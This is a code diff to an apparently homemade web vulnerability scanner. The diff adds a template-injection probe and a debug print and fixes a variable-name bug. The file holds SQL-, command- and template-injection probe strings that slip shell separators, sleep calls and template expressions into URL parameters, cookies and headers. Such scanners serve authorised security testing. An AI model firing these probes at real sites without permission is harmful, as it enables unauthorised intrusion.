@@ -21,9 +21,9 @@ TIME_BASED_SQL = ("' AND (SELECT sleep(10))-- -", "' AND (SELECT sleep(10))#", "
 ERROR_BASED_RCE = [i % (R, R) for i in (';expr %d + %d', ';%d + %d', '&&expr %d + %d', '&&%d + %d', '|expr %d + %d', '|%d + %d', '||expr %d + %d', '||%d + %d', '`expr %d + %d`', '`%d + %d`', '$((expr %d + %d))', '$((%d + %d))', )]
 ERROR_BASED_RCE+= [i % (R, R) for i in (';eval("%d+%d")', '&&eval("%d+%d")', '||eval("%d+%d")', '|eval("%d+%d")', )]
 TIME_BASED_RCE  = ["||sleep 10||",]
-SSTI = [i % (R, R) for i in ('${%d*%d}', '{{%d*%d}}', '{{%d*\'%d\'}}',)]
-SCAN_TYPES = ['ERROR_BASED_SQL', 'BOOLEAN_BASED_SQL', 'TIME_BASED_SQL', 'ERROR_BASED_RCE', 'TIME_BASED_RCE']
-INJECT, NOSCAN = 'INJECT', 'NOSCAN'
+SSTI = [i % (R, R) for i in ('${%d*%d}', '{{%d*%d}}', '{{%d*\'%d\'}}', '<%%= %d*%d %%>')]
+SCAN_TYPES = ['ERROR_BASED_SQL', 'BOOLEAN_BASED_SQL', 'TIME_BASED_SQL', 'ERROR_BASED_RCE', 'TIME_BASED_RCE', 'SSTI']
+# INJECT, NOSCAN = 'INJECT', 'NOSCAN'
 
 BOOLEAN_BASED_SQL = [] # TEST
 TIME_BASED_SQL  = [] # TEST
@@ -200,15 +200,15 @@ class Kestrel:
 
     def scan_ssti(self, url, pos, k, v, p):
         mark_multi = str(R * R)
+        print(v+p)
         if pos == 'url':
             r = self.get_or_post(url, params={k: v + p})
         if pos == 'cki':
             r = self.get_or_post(url, cookies={k: v + p})
         if pos == 'hdr':
             r = self.get_or_post(url, headers={k: v + p})
-        if re.search(mark_, r.text):
+        if re.search(mark_multi, r.text):
             return self.print_info(url, k, v+p, 'SSTI')
-
 
     def start(self):
         self.build_session()
